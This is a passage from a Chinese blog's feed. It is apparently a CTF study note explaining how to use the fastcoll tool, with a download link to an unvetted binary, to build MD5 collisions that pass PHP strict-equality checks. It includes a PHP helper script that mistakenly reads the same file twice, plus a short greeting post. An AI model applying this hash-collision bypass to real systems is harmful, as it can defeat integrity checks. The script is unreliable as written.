        <content type="html"><![CDATA[<h1 id="fastcoll"><a href="#fastcoll" class="headerlink" title="fastcoll"></a>fastcoll</h1><p><em>我用的不知道是哪个项目里面的，我就一个exe文件，可能是以前的吧(猫爹无奈)，也可以就用我的那个独子，也可以去网上找找新版本的更稳定的生成器</em></p><p>用于构造两个原值不同，但是MD5值相同的工具。在CTF里面如果给你两个String类型变量(用不了数组绕过)，还要你MD5强相等(&#x3D;&#x3D;&#x3D;)，就得用这个工具来构造了。这就叫MD5碰撞，分为有前缀和无前缀，在工具的同目录下应该有一个txt，里面写的是前缀，无前缀txt里面就为空。</p><p><a href="https://pan.baidu.com/s/1elcc1H6geZLf0Yul5d56NA?pwd=4dgb">下载</a></p><p>用法：</p><ol><li><p>直接把txt拖到exe上，会给你生成两个文件，还会弹出来个cmd窗口(猫爹严肃，演示的时候CMD卡死了，关也关不掉，最后任务管理器给他强制关的)</p><p><img src="/img/fastcoll.png"></p><p>最后输出的两个文件里面有不可编码字符，最好URL编码一下</p><p>脚本如下(记得改路径！)：</p><p><code>&lt;?php</code><br><code>function readmyfile($path)&#123;  $fh = fopen($path, &quot;rb&quot;);  $data = fread($fh, filesize($path));  fclose($fh);  return $data; &#125; $a = urlencode(readmyfile(&quot;C:/fastcoll/0_msg1.txt&quot;));</code><br><code>$b = urlencode(readmyfile(&quot;C:/fastcoll/0_msg1.txt&quot;)); if(md5((string)urldecode($a))===md5((string)urldecode($b)))&#123; echo $a; &#125; if(urldecode($a)!=urldecode($b))&#123; echo $b;</code><br><code>&#125;</code><br><code>?&gt;</code></p></li><li><p>也可以指定输出文件名</p><p>.&#x2F;fastcoll.exe -p 前缀文件.txt -o 输出文件1.txt 输出文件2.txt</p></li></ol><p>感觉用着应该略够，可能后面我会把它换成新的，到时候再更新，有兴趣的可以去看看现在新的fastcoll，感觉挺多的。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>好好学习，学好了再说别的，好好理财</title>
      <link href="/2025/11/21/hello-world/"/>
      <url>/2025/11/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>记录学习生活</p><p>希望以后也可以成为大佬</p><p><img src="/img/power.jpg"></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
